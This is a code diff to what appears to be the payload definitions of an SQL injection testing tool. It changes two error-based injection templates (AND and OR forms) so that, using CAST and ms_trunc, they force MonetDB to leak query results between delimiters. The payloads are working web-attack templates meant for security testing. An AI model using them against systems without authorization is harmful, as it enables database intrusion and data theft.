@@ -808,9 +808,10 @@
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <!-- ms_trunc (MonetDB-exclusive) encloses the value-bearing DECIMAL cast: reflects on MonetDB, fails to bind elsewhere -->
+        <vector>AND [RANDNUM]=(SELECT ms_trunc(CAST('[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR)||'[DELIMITER_STOP]' AS DECIMAL),1))</vector>
         <request>
-            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')</payload>
+            <payload>AND [RANDNUM]=(SELECT ms_trunc(CAST('[DELIMITER_START]'||CAST((SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR)||'[DELIMITER_STOP]' AS DECIMAL),1))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -827,9 +828,9 @@
         <risk>3</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <vector>OR [RANDNUM]=(SELECT ms_trunc(CAST('[DELIMITER_START]'||CAST(([QUERY]) AS VARCHAR)||'[DELIMITER_STOP]' AS DECIMAL),1))</vector>
         <request>
-            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')</payload>
+            <payload>OR [RANDNUM]=(SELECT ms_trunc(CAST('[DELIMITER_START]'||CAST((SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) AS VARCHAR)||'[DELIMITER_STOP]' AS DECIMAL),1))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
